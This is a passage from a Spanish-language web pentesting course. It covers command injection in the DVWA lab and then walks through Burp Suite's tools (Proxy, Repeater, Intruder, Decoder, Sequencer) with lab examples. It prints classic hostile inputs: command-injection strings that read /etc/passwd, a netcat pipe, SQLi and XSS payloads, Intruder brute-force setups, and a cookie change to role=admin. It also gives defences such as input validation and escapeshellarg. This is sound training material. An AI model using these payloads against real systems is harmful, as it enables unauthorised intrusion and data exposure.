4️⃣ Descargar DVWA:
👉 [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)

5️⃣ Copiar carpeta `dvwa` en:

```
C:\xampp\htdocs\
```

6️⃣ Configurar en el navegador:

```
http://localhost/dvwa/setup.php
```

7️⃣ Crear base de datos

8️⃣ En DVWA Security, elegir **Low**

✅ Listo para practicar:

```
http://localhost/dvwa/vulnerabilities/exec/
```

---

#### ✅ Ataques de ejemplo en DVWA

✅ Inyección sencilla:

```
127.0.0.1; ls
```

✅ Encadenar comandos:

```
127.0.0.1 && cat /etc/passwd
```

✅ Windows:

```
127.0.0.1 & dir
```

---

✅ Resultado:

- Ejecuta comandos adicionales en el servidor.
- Puede exponer archivos sensibles.
- Puede usarse para descargar shells.

---

#### ✅ Usar Burp Suite para automatizar

✅ Intercepta la petición con el parámetro vulnerable:

```
ip=127.0.0.1
```

✅ Usa Intruder:

- Payloads: `127.0.0.1; ls`, `127.0.0.1 && whoami`, etc.

✅ Analiza la respuesta:

- Verifica ejecución del comando inyectado.

---

#### ✅ Cómo defenderse contra Command Injection

✅ **No** usar entrada del usuario en comandos del sistema.

✅ Usar funciones seguras (en PHP):

```php
escapeshellarg()
escapeshellcmd()
```

✅ Validar y sanitizar inputs:

- Solo permitir direcciones IP válidas.

✅ Usar APIs del lenguaje en lugar de shell:

✅ En PHP:

```php
$ip = $_GET['ip'];
if (filter_var($ip, FILTER_VALIDATE_IP)) {
    // Usar exec de forma segura
}
```

✅ En Python:

```python
subprocess.run(["ping", ip])
```

✅ No concatenar strings.

---

### ✅ Resumen rápido de Command Injection

| Tema            | Explicación sencilla                                    |     |
| --------------- | ------------------------------------------------------- | --- |
| Qué es          | Ejecutar comandos del SO con entrada del usuario        |     |
| Ejemplo         | `127.0.0.1; ls`                                         |     |
| Ataques típicos | `; ls`, `&& whoami`, `                           \| nc` |
| Herramientas    | DVWA, Burp Suite                                        |     |
| Prevención      | Validar inputs, escapeshellarg/cmd, no concatenar       |     |

---

### ✅ Recursos para practicar

✅ DVWA:
👉 [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)

✅ Mutillidae II:
👉 [https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae)

✅ OWASP Testing Guide:
👉 [https://owasp.org/www-project-web-security-testing-guide/](https://owasp.org/www-project-web-security-testing-guide/)

✅ Burp Suite Community:
👉 [https://portswigger.net/burp/communitydownload](https://portswigger.net/burp/communitydownload)

---

[🔼](#índice)

---

## **70. Contenido avanzado sobre Burp Suite**

### 🌟 **1️⃣ Breve repaso: ¿Qué es Burp Suite?**

✅ Burp Suite es una **plataforma de prueba de seguridad de aplicaciones web**.

✅ Actúa como **proxy interceptador** entre el navegador y el servidor web.

✅ Permite **analizar, modificar y automatizar ataques** a aplicaciones web.

✅ Hay dos versiones principales:

- **Community (gratis)**
- **Professional (de pago, con más features como el scanner automatizado)**

---

### 🌟 **2️⃣ Instalación paso a paso**

---

#### ✅ A. En Windows

✅ 1️⃣ Descarga desde:
👉 [https://portswigger.net/burp/communitydownload](https://portswigger.net/burp/communitydownload)

✅ 2️⃣ Ejecuta el instalador .exe

✅ 3️⃣ Sigue el asistente (Siguiente → Siguiente → Finalizar)

✅ 4️⃣ Abre Burp Suite

---

#### ✅ B. En Linux (Ubuntu/Kali)

✅ Descarga el .sh desde el mismo enlace.

✅ Dale permisos de ejecución:

```bash
chmod +x burpsuite_community_linux_v*.sh
```

✅ Ejecuta el instalador:

```bash
./burpsuite_community_linux_v*.sh
```

✅ Sigue el asistente gráfico.

✅ También puedes usar el .jar (requiere Java):

```bash
java -jar burpsuite_community_v*.jar
```

---

#### ✅ C. En macOS

✅ Descarga el .dmg desde el sitio oficial.

✅ Monta la imagen y arrastra Burp Suite a Aplicaciones.

✅ Abre Burp Suite.

---

### ✅ 3️⃣ Configurar el navegador para usar Burp como proxy

✅ Burp Suite usa por defecto:

```
Proxy listener en 127.0.0.1:8080
```

✅ Tienes dos opciones:

---

#### ✅ Opción 1: Configuración manual en navegador

- Firefox → Preferencias → General → Configuración de red → Configuración manual:

```
HTTP Proxy: 127.0.0.1
Puerto: 8080
```

✅ Marca **Usar este proxy para todos los protocolos**.

---

#### ✅ Opción 2: Usar **Burp's Embedded Browser** (más fácil)

- Abre Burp → Proxy → Intercept → Open Browser

✅ Ya está configurado automáticamente.

---

✅ Burp también te permite exportar e instalar su **CA Certificate** para interceptar HTTPS:

- Proxy → Options → CA Certificate
- Instálalo en el navegador → Confía en la CA

---

### ✅ 4️⃣ Herramientas avanzadas de Burp Suite

---

#### ✅ 🔎 **Proxy → Intercept**

✅ Permite **ver y modificar** todas las peticiones entre el navegador y el servidor.

✅ Puedes:

- Modificar parámetros GET/POST
- Cambiar cookies
- Editar cabeceras
- Alterar JSON, XML

✅ Ejemplo:

```
POST /login HTTP/1.1
username=admin&password=1234
```

➡️ Cambiar en vivo a:

```
username=admin' -- &password=1234
```

✅ Resultado: prueba de SQLi.

---

#### ✅ 🧪 **Repeater**

✅ Permite **enviar la misma petición varias veces** modificándola cada vez.

✅ Flujo típico:

1️⃣ Captura una petición con Intercept.

2️⃣ Enviar a Repeater (botón derecho → Send to Repeater).

3️⃣ Edita el contenido.

4️⃣ Haz clic en **Send**.

5️⃣ Observa la respuesta.

✅ Muy útil para:

- Probar inyecciones SQL, XSS
- Afinar payloads
- Ver diferencias en la respuesta

✅ Ejemplo:

```
?search=test
```

➡️ Cambiar en Repeater:

```
?search=<script>alert(1)</script>
```

---

#### ✅ 💥 **Intruder**

✅ Herramienta de **ataque automatizado** → Fuzzing.

✅ Flujo:

1️⃣ Captura la petición.

2️⃣ Enviar a Intruder.

3️⃣ Definir posiciones (dónde poner payloads).

4️⃣ Cargar lista de payloads.

5️⃣ Iniciar ataque.

✅ Usos:

- Brute force de contraseñas
- Enumerar usuarios
- Probar payloads XSS o SQLi

✅ Ejemplo:

```
POST /login
username=§admin§&password=§password§
```

➡️ Payload list: 100 contraseñas

➡️ Intruder prueba cada combinación.

---

#### ✅ 🧩 **Extender**

✅ Permite **instalar extensiones** desde el **BApp Store**.

✅ Hay cientos de herramientas, como:

- ActiveScan++ → mejores escaneos
- Logger++ → historial de tráfico
- Autorize → test de control de acceso
- J2EEScan → vulnerabilidades en Java apps

✅ Cómo usar:

1️⃣ Ir a **Extender → BApp Store**

2️⃣ Elegir extensión

3️⃣ Instalar

✅ Puedes cargar tus propios scripts en Python (con Jython).

---

#### ✅ 🧬 **Decoder**

✅ Convierte y decodifica datos:

- URL encoding
- Base64
- HTML entities
- Hex

✅ Ejemplo:

```
Input: %3Cscript%3E
Output: <script>
```

✅ Muy útil para ver payloads obfuscados.

---

#### ✅ ⚖️ **Comparer**

✅ Compara dos peticiones o respuestas lado a lado.

✅ Usos:

- Ver diferencias de respuesta con y sin payload.
- Confirmar bypass de WAF.
- Analizar cambios tras login/logout.

✅ Flujo:

1️⃣ Cargar dos items.

2️⃣ Comparer → Word/Byte level diff.

---

#### ✅ 🎲 **Sequencer**

✅ Analiza la **aleatoriedad de tokens**.

✅ Flujo:

- Capturar muchos tokens de sesión.
- Analizarlos con Sequencer.
- Resultado → Gráficas de entropía y predicción.

✅ Muy útil para:

- Revisar tokens de sesión.
- Confirmar si son predecibles.

---

### ✅ 5️⃣ Ejemplo avanzado: Ataque con Intruder

✅ Escenario:

Formulario de login vulnerable a brute force.

```
POST /login
username=admin&password=test
```

✅ Flujo:

1️⃣ Captura con Intercept.

2️⃣ Envía a Intruder.

3️⃣ Define posiciones:

```
username=admin&password=§password§
```

4️⃣ Carga lista de contraseñas comunes.

5️⃣ Inicia el ataque.

6️⃣ Analiza respuestas:

✅ Identifica respuesta diferente para login correcto.

---

### ✅ 6️⃣ Ejemplo avanzado: XSS con Repeater

✅ DVWA → Vulnerabilidad XSS Reflected

```
GET /vulnerabilities/xss_r/?name=test
```

✅ Flujo:

1️⃣ Captura la petición.

2️⃣ Envía a Repeater.

3️⃣ Modifica:

```
?name=<script>alert(1)</script>
```

4️⃣ Haz **Send**.

5️⃣ Observa respuesta → ¿el script se refleja?

---

### ✅ 7️⃣ Ejemplo avanzado: Modificación de Cookies

✅ En Intercept:

```
Cookie: role=user
```

➡️ Modificar:

```
role=admin
```

✅ Forward → Ver respuesta.

✅ Usado para:

- Cookie tampering
- Session fixation
- Test de controles de acceso

---

### ✅ 8️⃣ Integración con otras herramientas

✅ Puedes usar Burp como proxy de:

- XSStrike → para XSS
- SQLMap → para SQLi
- Zaproxy → comparación
- Custom scripts

✅ Ejemplo XSStrike con Burp:

```
python3 xsstrike.py -u "http://target.com" --proxy http://127.0.0.1:8080
```

✅ Todas las peticiones pasan por Burp.

---

### ✅ 9️⃣ Instalación de laboratorios vulnerables para practicar

✅ DVWA
👉 [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)

✅ Mutillidae II
👉 [https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae)

✅ bWAPP
👉 [https://sourceforge.net/projects/bwapp/](https://sourceforge.net/projects/bwapp/)

✅ Juice Shop
👉 [https://owasp.org/www-project-juice-shop/](https://owasp.org/www-project-juice-shop/)

✅ Son perfectos para practicar con Burp Suite:

- Interceptar
- Modificar
- Automatizar ataques
- Ver respuesta del servidor

---

### ✅ 10 Consejos para uso avanzado

✅ Aprende **Regex** → Para definir posiciones en Intruder.

✅ Usa **Burp Macros** → Automatiza flujos de login.

✅ Usa **Session Handling Rules** → Mantén sesión activa.

✅ Explora **Burp Collaborator** (Pro) → Descubre XSS, SSRF out-of-band.

✅ Aprende a **escribir extensiones** en Python/Jython.

---

### ✅ 📌 RESUMEN SUPER CORTO

| Herramienta | Qué hace                              | Uso común                    |
| ----------- | ------------------------------------- | ---------------------------- |
| Proxy       | Intercepta tráfico                    | Ver/modificar peticiones     |
| Repeater    | Repite peticiones modificadas         | Probar inyecciones, payloads |
| Intruder    | Ataques automatizados                 | Brute force, fuzzing         |
| Decoder     | Codifica/decodifica datos             | Ver obfuscación              |
| Comparer    | Compara peticiones/respuestas         | Analizar cambios             |
| Sequencer   | Analiza tokens                        | Validar entropía             |
| Extender    | Añade funcionalidades con extensiones | Logger++, Autorize, etc.     |

---

✅ **Burp Suite es la navaja suiza para pentesters web.**

---

### ✅ 📌 Recursos oficiales

✅ Burp Suite Community:
👉 [https://portswigger.net/burp/communitydownload](https://portswigger.net/burp/communitydownload)

✅ Manual oficial:
👉 [https://portswigger.net/burp/documentation](https://portswigger.net/burp/documentation)

✅ BApp Store:
👉 [https://portswigger.net/bappstore](https://portswigger.net/bappstore)

✅ OWASP Web Security Testing Guide:
👉 [https://owasp.org/www-project-web-security-testing-guide/](https://owasp.org/www-project-web-security-testing-guide/)

---

[🔼](#índice)

---

| **Inicio**         | **atrás 6**                                                       | **Siguiente 8**                                                 |
| ------------------ | ----------------------------------------------------------------- | --------------------------------------------------------------- |
| [🏠](../README.md) | [⏪](./2_6_Explotacion_y_hacking_de_vulnerabilidades_en_hosts.md) | [⏩](./2_8_Explotacion_y_hacking_de_vulnerabilidades_en_red.md) |
